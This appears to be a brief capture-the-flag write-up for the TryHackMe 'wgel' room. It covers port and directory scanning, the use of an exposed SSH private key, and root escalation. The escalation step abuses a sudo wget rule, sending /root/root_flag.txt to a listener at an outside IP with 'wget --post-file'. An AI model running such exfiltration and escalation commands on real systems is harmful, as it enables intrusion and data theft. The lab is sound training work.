# [Challenge](https://tryhackme.com/room/wgelctf)

- # ENUM
	- ### nmap (`nmap -A -p- -T4 --min-rate=5000 wgel`)
		- 22 -> ssh
		- 80 -> http (Apache 2.4.18)
	- ### gobuster (`gobuster dir -w /usr/share/wordlists/directory-list-lowercase-2.3-big.txt -u http://wgel -x .html,.txt,.js,.php -t 300`)
		- ### DIRECTORIES
			- `/sitemap`
				- `/.ssh`

- # EXPLOITATION
	- `wgel/` -> `<!-- Jessie don't forget to udate the webiste -->`
	- We have the `id_rsa` in `wgel/sitemap/.ssh/id_rsa`! Let's use `john`:
		- `id_rsa has no password!`
			- Let's connect to SSH as `jessie`

- # PRIVILEGE ESCALATION
	- `sudo -l` -> `(root) NOPASSWD: /usr/bin/wget`
		- We can run `wget` as root!
			- `nc -lvnp` -> `sudo /usr/bin/wget --post-file=/root/root_flag.txt 10.8.13.111:4444`
				- We got the flag!
